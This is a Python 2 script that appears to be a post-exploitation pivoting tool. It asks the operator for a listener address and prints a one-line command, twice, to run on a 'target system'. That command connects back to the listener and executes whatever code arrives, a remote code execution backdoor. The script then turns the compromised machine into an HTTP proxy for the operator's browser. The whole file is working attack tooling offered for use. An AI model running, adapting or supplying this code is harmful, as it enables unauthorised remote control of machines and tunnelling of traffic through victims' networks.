#!/usr/bin/env python


import socket
PHOST = '127.0.0.1'
PPORT = 8080



def srv():
    s1=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s1.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    while not 'LHOST' in locals() or not 'LPORT' in locals():
        try:
            LHOST,LPORT = raw_input('Enter listener (IP:Port): ').split(':')
            LPORT = int(LPORT)
        except:
            print "[*] Input must be in the form IP:PORT, (ex. 192.168.14.32:443)\n"
    s1.bind(('0.0.0.0',LPORT))
    print ("[*] Execute one of the following command on the target system" 
                                       " to establish the connection: \n ")
    print ("python -c \"while True: import socket;s=socket.socket(socket.AF_INET,"
                       "socket.SOCK_STREAM);s.connect(('%s',%s));exec(s.recv(100000));"
                       "s.close();\"\n\n") % (LHOST,LPORT)
    print ("python -c \"while True: import socket;s=socket.socket(socket.AF_INET,"
                       "socket.SOCK_STREAM);s.connect(('%s',%s));exec(s.recv(100000));"
                       "s.close();\"\n\n") % (LHOST,LPORT)
    
    s1.listen(1)
    c1, h = s1.accept()
    
    print "[*] Connection from %s \n" % h[0]
    
    #c1.send("out='!';" + raw_input('>') + "s.send(out);")
    #data=c1.recv(1024)

    print "[*] Set your browser proxy to %s:%s to proxy through the remote machine\n" % (PHOST, PPORT)
        
    while True:
        s2=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s2.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s2.bind((PHOST,PPORT))
        s2.listen(1)
        print "listening...\n"
        c2 = s2.accept()[0]
        print "connection accepted...\n"
        data = c2.recv(1000000)
        print "data received...\n"
        if data:
            print "handling data...\n"
            h = 'HTTP/1.1 200 OK\n'
            h += 'Content-Type: text/html; charset=utf-8'
            h += 'Connection: close\n\n'
            r = h + '<h1>No Response</h1>' 
            try:
                import base64
                d64=base64.encodestring(data)
                c1.send(d64)
                r = c1.recv(1000000)
                r = base64.decodestring(r) 
	    except Exception as e:
                print str(e)   
                r += '\n<pre>' + str(e) + '</pre>'            
                r += '\n<pre>' + data + '</pre>'            
            c2.send(r)
        c2.close()
        s2.close()
                       



srv()
